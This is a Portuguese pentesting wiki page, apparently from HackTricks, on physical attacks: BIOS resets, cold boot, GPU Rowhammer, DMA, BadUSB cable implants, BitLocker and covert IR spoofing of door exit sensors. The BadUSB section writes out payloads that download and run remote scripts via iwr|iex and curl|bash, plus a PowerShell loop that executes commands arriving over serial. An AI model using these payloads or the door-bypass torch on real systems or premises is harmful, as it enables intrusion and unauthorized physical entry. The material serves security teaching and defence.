# Ataques físicos

{{#include ../banners/hacktricks-training.md}}

## Recuperação de senha do BIOS e segurança do sistema

As configurações de firmware de PCs legados podem ser redefinidas desconectando a bateria CMOS ou usando um jumper de limpeza da CMOS documentado. O tempo necessário com o equipamento desligado depende da placa, e senhas ou chaves de UEFI modernas podem estar armazenadas em memória flash não volátil, em um controlador incorporado ou em um dispositivo de segurança e, portanto, sobreviver à remoção da bateria. Consulte o manual da placa ou de serviço antes de causar um curto entre os pinos; esse procedimento também pode invalidar medições do TPM e acionar a recuperação da criptografia de disco.

Em sistemas x86 legados, ferramentas como **killCMOS** e **CmosPwd** podem inspecionar ou alterar configurações armazenadas na CMOS a partir de um ambiente inicializável. O CmosPwd reconhece formatos de senha de um conjunto documentado de famílias antigas de BIOS e pode fazer backup, restaurar ou apagar/eliminar o estado da CMOS; suas builds publicadas têm como alvo ambientes legados DOS/Windows, Linux, FreeBSD e NetBSD.<sup>[[18]](#references)</sup> Esses utilitários não são removedores genéricos de senhas de UEFI e exigem acesso suficiente ao hardware/firmware.

Alguns firmwares de laptops exibem um código de desafio específico do fornecedor após várias tentativas de senha malsucedidas. Databases como [bios-pw.org](https://bios-pw.org) podem derivar senhas de recuperação legadas do fornecedor para alguns modelos, mas muitos sistemas implementam bloqueio sem um desafio derivável. Considere qualquer senha gerada como específica do modelo e evite esgotar contadores permanentes de tentativas.

### Segurança de UEFI

Para sistemas **UEFI** modernos, o CHIPSEC pode auditar as proteções das variáveis do Secure Boot. Comece com a verificação que não modifica o sistema abaixo; o modo opcional `-a modify` tenta deliberadamente corromper variáveis e deve ser usado somente em um sistema de laboratório recuperável. O próprio CHIPSEC alerta que seu driver privilegiado e o acesso ao hardware de baixo nível não são adequados para endpoints de produção.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## Análise de RAM e Ataques Cold Boot

A DRAM não perde todos os bits imediatamente quando a atualização para. A taxa de degradação varia substancialmente conforme a tecnologia do módulo e a temperatura; o resfriamento pode preservar dados úteis por muito mais tempo do que um ciclo de energia sem resfriamento. Um ataque cold boot reinicializa rapidamente o sistema em um pequeno ambiente de aquisição ou transfere um módulo resfriado, captura a memória bruta e reconstrói chaves criptográficas apesar da degradação dos bits. Um utilitário de cópia de disco não é automaticamente um imager de memória física, e o Volatility analisa uma captura em vez de adquiri-la; use uma ferramenta de aquisição apropriada à plataforma e validada.<sup>[[12]](#references)</sup>

---

## Rowhammer de GPU Contra Tabelas de Páginas

Os ataques modernos de GPU Rowhammer se tornam muito mais úteis quando visam **metadados de memória virtual da GPU** em vez de buffers comuns. Trabalhos recentes sobre **GPUs NVIDIA Ampere com GDDR6** mostram que um atacante executando código CUDA sem privilégios pode criar padrões de hammering específicos para GPUs, usar **memory massaging** para posicionar estruturas de paginação em linhas vulneráveis e, então, inverter bits na **tabela de páginas de último nível** ou em um **diretório de páginas intermediário**. Quando uma única entrada de tradução é corrompida, o atacante pode obter **leitura/escrita arbitrária na memória da GPU** e, em seguida, realizar um pivot para comprometer o host.<sup>[[1]](#references)[[2]](#references)</sup>

### Padrão de Exploração

1. **Criar o perfil das linhas que podem sofrer hammering** em GDDR6 e construir padrões de hammering sensíveis à atualização / não uniformes que contornem as mitigações na DRAM.
2. **Realizar o massaging das alocações da GPU** para que o driver posicione as estruturas de tradução de páginas em locais físicos vulneráveis, em vez de mantê-las no pool protegido padrão. Na prática, isso pode significar esgotar a região de tabelas de páginas de memória baixa e fazer spraying de grandes mapeamentos UVM esparsos com strides controlados.
3. **Inverter metadados de tradução**, como **PFN** ou bits relacionados à aperture, dentro de uma entrada de tabela de páginas / diretório de páginas, fazendo com que a página virtual controlada pelo atacante seja resolvida para páginas de tabelas de páginas, memória arbitrária da GPU ou mapeamentos de sistema visíveis ao host.
4. Reutilizar o mapeamento forjado para reescrever entradas de tradução adicionais e escalar para **leitura/escrita arbitrária na memória da GPU** entre contextos de GPU.

### Pivot para o Host e Mitigações

- Com a **IOMMU desativada**, mapeamentos forjados da aperture do sistema podem expor memória física arbitrária do **host** à GPU, transformando a primitiva da GPU em um comprometimento completo do host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- O **GDDRHammer** tem como alvo entradas da tabela de páginas de último nível, enquanto o **GeForge** mostra que corromper um nível de diretório de páginas pode ser mais fácil, pois uma inversão de bit pode redirecionar uma subárvore de tradução maior. Não trate apenas uma camada de paginação como crítica para a segurança.<sup>[[1]](#references)[[2]](#references)</sup>
- A **IOMMU** ainda é importante porque bloqueia o caminho direto para memória arbitrária do host usado pelo GDDRHammer/GeForge, mas **não é uma mitigação completa**. O **GPUBreach** mostra um pivot de segundo estágio no qual o atacante corrompe buffers de CPU graváveis pela GPU e pertencentes ao driver e, em seguida, aciona bugs de segurança de memória do driver NVIDIA para obter uma primitiva de escrita no kernel e um **root shell**, mesmo com a IOMMU habilitada.<sup>[[3]](#references)</sup>
- A **ECC em nível de sistema** é uma medida prática de hardening em GPUs de workstation/servidor compatíveis. GPUs de consumo sem ECC expõem uma superfície de defesa mais fraca.<sup>[[4]](#references)</sup>
- Esses ataques não são puramente teóricos: o **GeForge** relatou **1.171** inversões de bits em uma RTX 3060 e **202** em uma RTX A6000, o que foi suficiente para criar uma cadeia funcional de escalação de privilégios no host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Ataques de Acesso Direto à Memória (DMA)

O **Inception** demonstra **aquisição e patching de memória baseados em DMA** por interfaces como FireWire e configurações iniciais do Thunderbolt, incluindo assinaturas históricas de bypass de login. Ele não é simplesmente “ineficaz contra o Windows 10”: a explorabilidade depende da interface, da build do alvo, da política da IOMMU, do estado de bloqueio e de o Windows Kernel DMA Protection ser compatível e estar habilitado. O Windows 10 versão 1803 e posteriores introduziu o Kernel DMA Protection em plataformas compatíveis, alterando substancialmente a superfície de ataque.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB para Acesso ao Sistema

Em um volume do Windows não criptografado ou já desbloqueado, um ambiente offline pode substituir binários de acessibilidade, como **sethc.exe** ou **Utilman.exe**, por **cmd.exe**, produzindo um prompt de comando SYSTEM quando o atalho correspondente da tela de login é executado. Ferramentas como **chntpw** podem editar dados de contas locais do SAM. Esses métodos não contornam um volume BitLocker bloqueado e podem danificar credenciais protegidas por DPAPI/EFS; preserve cópias forenses e backups.

O **Kon-Boot** é uma ferramenta comercial de bypass de autenticação no boot para configurações compatíveis de Windows/macOS. A compatibilidade depende do sistema operacional, do modo do firmware, do Secure Boot e da configuração de criptografia do disco; ele não descriptografa um volume bloqueado pelo BitLocker.<sup>[[10]](#references)</sup>

---

## Tratamento dos Recursos de Segurança do Windows

### Atalhos de Boot e Recuperação

- **Delete/Supr**, F2, F10 ou outra tecla do fabricante pode abrir a configuração do firmware.
- **F8** entra nas opções avançadas de boot legadas do Windows apenas em configurações nas quais esse caminho continua habilitado; a entrada na recuperação atual varia.
- Manter **Shift** pressionado pode suprimir o login automático do Windows em algumas configurações, embora políticas/configurações do registro possam desabilitar esse comportamento.<sup>[[17]](#references)</sup>

### Dispositivos BAD USB

Dispositivos como **USB Rubber Ducky** e placas Teensy podem ser enumerados como teclados HID confiáveis e injetar pressionamentos de teclas predefinidos. A carga inicialmente tem os privilégios e o acesso à área de trabalho da sessão conectada; prompts do UAC, bloqueio da tela, layout do teclado, temporização e política USB do endpoint ainda a restringem.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Privilégios de administrador ou de backup podem criar uma cópia shadow ou salvar hives do registro para que arquivos bloqueados, como **SAM** e **SYSTEM**, possam ser adquiridos. Essa é uma técnica de coleta pós-comprometimento, não um bypass de privilégios, e deve ser correlacionada com eventos de `diskshadow`/VSS e de exportação de hives do registro.

## Técnicas de Implantes BadUSB / HID

### Implantes de cabos gerenciados por Wi-Fi

- Implantes baseados em ESP32-S3, como o **Evil Crow Cable Wind**, ficam ocultos dentro de cabos USB-A→USB-C ou USB-C↔USB-C, são enumerados exclusivamente como um teclado USB e expõem sua stack de C2 por Wi-Fi. O operador só precisa alimentar o cabo pelo host da vítima, criar um hotspot chamado `Evil Crow Cable Wind` com a senha `123456789` e acessar [http://cable-wind.local/](http://cable-wind.local/) (ou seu endereço DHCP) para alcançar a interface HTTP incorporada.<sup>[[8]](#references)</sup>
- A interface do navegador fornece abas para *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* e *Config*. As cargas armazenadas são identificadas por sistema operacional, os layouts de teclado são alterados em tempo real e as strings VID/PID podem ser modificadas para imitar periféricos conhecidos.
- Como o C2 fica dentro do cabo, um telefone pode preparar cargas, acionar sua execução e gerenciar credenciais de Wi-Fi sem usar a rede da organização — útil para intrusões físicas de curta permanência.

### Cargas AutoExec cientes do sistema operacional

- As regras AutoExec vinculam uma ou mais cargas para serem executadas imediatamente após a enumeração USB. O implante realiza uma identificação leve do sistema operacional e seleciona o script correspondente.
- Exemplo de fluxo:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) ou `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Como a execução é não assistida, simplesmente trocar um cabo de carregamento pode obter acesso inicial “plug-and-pwn” no contexto do usuário conectado.

### Remote shell iniciado por HID sobre Wi-Fi TCP

1. **Bootstrap por pressionamento de teclas:** uma carga armazenada abre um console e cola um loop que executa tudo o que chegar no novo dispositivo serial USB. Uma variante mínima para Windows é:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Ponte de cabo:** O implante mantém o canal USB CDC aberto enquanto seu ESP32-S3 inicia um cliente TCP (script Python, APK Android ou executável para desktop) de volta ao operador. Todos os bytes digitados na sessão TCP são encaminhados para o loop serial acima, permitindo a execução remota de comandos até mesmo em hosts isolados. A saída é limitada, portanto os operadores normalmente executam comandos às cegas (criação de contas, preparação de ferramentas adicionais etc.).

### Superfície de atualização OTA via HTTP

- A interface documentada do Evil Crow Cable Wind expõe um endpoint de atualização de firmware não autenticado em `/update`:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Operadores em campo podem trocar recursos a quente (por exemplo, o firmware do flash USB Army Knife) durante o engagement sem abrir o cabo, permitindo que o implant mude para novos recursos enquanto continua conectado ao host-alvo.

## Bypass da Criptografia BitLocker

Uma aquisição forense autorizada de um sistema ativo ou executado recentemente pode conter uma chave mestra de volume do BitLocker ou material de chave relacionado enquanto o volume está desbloqueado. Ferramentas comerciais como Elcomsoft Forensic Disk Decryptor e Passware Kit Forensic podem pesquisar imagens de memória, arquivos de hibernação ou dumps de memória compatíveis, mas o sucesso não é garantido. O Windows moderno também criptografa dumps de memória quando o BitLocker está habilitado, e uma senha de recuperação armazenada de 48 dígitos é um artefato diferente de uma chave de volume presente na memória.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering para Adição da Chave de Recuperação

Um atacante que convença um administrador a executar comandos de gerenciamento do BitLocker pode adicionar uma senha de recuperação, chave externa ou outro protector e então capturá-lo. Uma senha de recuperação não pode ser uma sequência arbitrária de zeros: as senhas numéricas de recuperação do BitLocker têm um formato validado de 48 dígitos. A sintaxe de administração autorizada relevante é `manage-bde -protectors -add C: -recoverypassword`; liste os protectors resultantes com `manage-bde -protectors -get C:`. Monitore a adição de protectors e garanta que o novo material de recuperação seja armazenado apenas em locais aprovados.<sup>[[16]](#references)</sup>

---

## Explorando Chassis Intrusion / Switches de Manutenção para Restaurar o BIOS às Configurações de Fábrica

Muitos laptops modernos e desktops small-form-factor incluem um **chassis-intrusion switch** monitorado pelo Embedded Controller (EC) e pelo firmware do BIOS/UEFI. Embora o objetivo principal do switch seja gerar um alerta quando um dispositivo é aberto, alguns fornecedores implementam um **atalho de recuperação não documentado**, acionado quando o switch é alternado em um padrão específico.<sup>[[5]](#references)[[6]](#references)</sup>

### Como o Ataque Funciona

1. O switch é conectado a uma **GPIO interrupt** no EC.
2. O firmware executado no EC mantém o controle do **tempo e do número de acionamentos**.
3. Quando um padrão definido no código é reconhecido, o EC invoca uma rotina de *mainboard-reset* que **apaga o conteúdo da NVRAM/CMOS do sistema**.
4. Na próxima inicialização, os modelos afetados carregam o estado de firmware redefinido. Dependendo do fornecedor e da revisão, o estado apagado pode incluir uma senha de supervisor, configurações personalizadas de inicialização ou chaves do Secure Boot registradas; o estado do TPM e os efeitos sobre a criptografia do disco devem ser avaliados separadamente.

> Uma redefinição do firmware pode restaurar as opções de inicialização externa, mas **não** descriptografa o armazenamento. O BitLocker ou outro sistema de criptografia de disco completo pode entrar em modo de recuperação após alterações no TPM/firmware e continuar protegendo a unidade interna sem uma chave de recuperação.<sup>[[16]](#references)</sup>

### Exemplo no Mundo Real – Laptop Framework 13

O atalho de recuperação do Framework 13 (11ª/12ª/13ª geração) é:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Após o décimo ciclo, o EC define uma flag que instrui o BIOS a apagar a NVRAM na próxima reinicialização. Todo o procedimento leva ~40 s e requer **nada além de uma chave de fenda**.<sup>[[5]](#references)</sup>

### Procedimento genérico de Exploitation

1. Ligue ou suspenda-retome o alvo para que o EC esteja em execução.
2. Remova a tampa inferior para expor o switch de intrusão/manutenção.
3. Reproduza o padrão de alternância específico do fornecedor (consulte a documentação, fóruns ou faça reverse-engineering do firmware do EC).
4. Remonte e reinicie; em seguida, verifique quais configurações de firmware e credenciais realmente foram alteradas.
5. Se autorizado e o boot externo estiver disponível, inicialize uma live image controlada. Quando um volume interno estiver legitimamente desbloqueado (ou se nunca tiver sido criptografado), o ambiente live poderá obter credenciais e dados ou inspecionar a EFI System Partition. Modificar essa partição para instalar um EFI implant é persistente e altamente invasivo, além de continuar limitado pelo Secure Boot, measured boot, proteção contra gravação do firmware e monitoramento do endpoint. O armazenamento criptografado permanece inacessível sem sua chave ou material de recuperação.

### Detecção e Mitigação

* Registre eventos de intrusão no chassi no console de gerenciamento do sistema operacional e correlacione-os com resets inesperados do BIOS.
* Utilize **selos invioláveis** nos parafusos/tampas para detectar abertura.
* Mantenha os dispositivos em **áreas fisicamente controladas**; presuma que o acesso físico equivale a um comprometimento total.
* Quando disponível, desative o recurso do fornecedor de “reset pelo switch de manutenção” ou exija uma autorização criptográfica adicional para resets da NVRAM.

---

## Injeção IR encoberta contra sensores de saída No-Touch

### Características do sensor
- Sensores comerciais de “wave-to-exit” combinam um emissor de LED near-IR com um módulo receptor semelhante aos de controles remotos de TV, que só reporta nível lógico alto após detectar múltiplos pulsos (~4–10) da portadora correta (≈30 kHz).<sup>[[7]](#references)</sup>
- Uma cobertura plástica impede que o emissor e o receptor se observem diretamente, fazendo o controlador presumir que qualquer portadora validada veio de uma reflexão próxima e acionar um relé que abre a fechadura da porta.
- Quando o controlador acredita que um alvo está presente, ele frequentemente altera o envelope de modulação de saída, mas o receptor continua aceitando qualquer burst que corresponda à portadora filtrada.

### Fluxo do ataque
1. **Capture o perfil de emissão** – conecte um analisador lógico aos pinos do controlador para registrar as formas de onda pré-detecção e pós-detecção que acionam o LED IR interno.
2. **Reproduza apenas a forma de onda “pós-detecção”** – remova/ignore o emissor original e acione um LED IR externo com o padrão já disparado desde o início. Como o receptor só considera a contagem/frequência dos pulsos, ele trata a portadora spoofed como uma reflexão genuína e ativa a linha do relé.
3. **Controle a transmissão** – transmita a portadora em bursts ajustados (por exemplo, dezenas de milissegundos ligada e intervalo semelhante desligada) para fornecer a contagem mínima de pulsos sem saturar o AGC do receptor ou sua lógica de tratamento de interferência. A emissão contínua rapidamente dessensibiliza o sensor e impede o acionamento do relé.

### Injeção refletiva de longo alcance
- Substituir o LED de bancada por um diodo IR de alta potência, um driver MOSFET e óptica de focalização permite um acionamento confiável a ~6 m de distância.
- O atacante não precisa de line-of-sight para a abertura do receptor; apontar o feixe para paredes internas, prateleiras ou batentes de portas visíveis através do vidro permite que a energia refletida entre no campo de visão de ~30° e simule um aceno de mão a curta distância.
- Como os receptores esperam apenas reflexões fracas, um feixe externo muito mais forte pode ricochetear em várias superfícies e ainda permanecer acima do limiar de detecção.

### Attack Torch weaponised
- Incorporar o driver dentro de uma lanterna comercial oculta a ferramenta à vista de todos. Substitua o LED visível por um LED IR de alta potência compatível com a banda do receptor, adicione um ATtiny412 (ou similar) para gerar os bursts de ≈30 kHz e use um MOSFET para drenar a corrente do LED.
- Uma lente zoom telescópica estreita o feixe para alcance/precisão, enquanto um motor de vibração sob controle do MCU fornece confirmação háptica de que a modulação está ativa sem emitir luz visível.
- Alternar entre vários padrões de modulação armazenados (frequências de portadora e envelopes ligeiramente diferentes) aumenta a compatibilidade entre famílias de sensores rebranded, permitindo ao operador varrer superfícies refletivas até ouvir o clique do relé e a porta ser liberada.

---

## References

- [1] [GDDRHammer: Perturbando bastante as linhas DRAM — Ataques Rowhammer entre componentes a partir de GPUs modernas](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Aplicando Hammering à memória GDDR para forjar tabelas de páginas de GPU por diversão e lucro](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Ataques de escalada de privilégios em GPUs usando Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Aviso de segurança: Rowhammer - julho de 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Pressione aqui para fazer pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Guia de Reset da Mainboard](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Nãããão toque! – Bypass de sensores de saída IR No-Touch com uma lanterna IR encoberta”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Conecte, reproduza, faça pwn: Hacking com Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Ataque Rowhammer contra chips NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Documentação oficial e informações de compatibilidade do Kon-Boot](https://kon-boot.com/)
- [11] [Documentação do CHIPSEC - Proteções de variáveis do Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Ataques Cold Boot contra chaves de criptografia](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - manipulação de memória física por DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Documentação do Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Guia de operações do BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - comportamento de manter Shift pressionado e do logon automático](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Documentação e downloads do CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
